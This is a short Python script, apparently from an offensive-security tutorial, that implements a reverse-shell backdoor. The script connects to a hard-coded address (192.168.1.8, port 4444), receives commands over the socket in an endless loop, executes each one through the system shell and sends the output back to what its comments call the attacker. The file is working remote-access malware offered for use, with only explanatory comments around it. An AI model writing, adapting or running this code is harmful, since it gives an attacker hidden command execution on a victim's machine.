#!/usr/bin/env python

import socket
import subprocess

class Backdoor:
    def __init__(self, ip, port):
        # create a socket object (an instance of the connection)
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # connect to our target with this socket object
        self.connection.connect((ip, port))


    # this function is to return the result of system command
    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        # execute these commands in a loop to be able to send commands continuously
        while True:
            # receive data in a variable named command
            command = self.connection.recv(1024)

            # pass this command variable to a function named execute_system_command
            command_result = self.execute_system_command(command)

            # send the result to the attacker
            self.connection.send(command_result)

        connection.close()

#create an instance of the object and run the class
my_backdoor = Backdoor("192.168.1.8", 4444)
my_backdoor.run()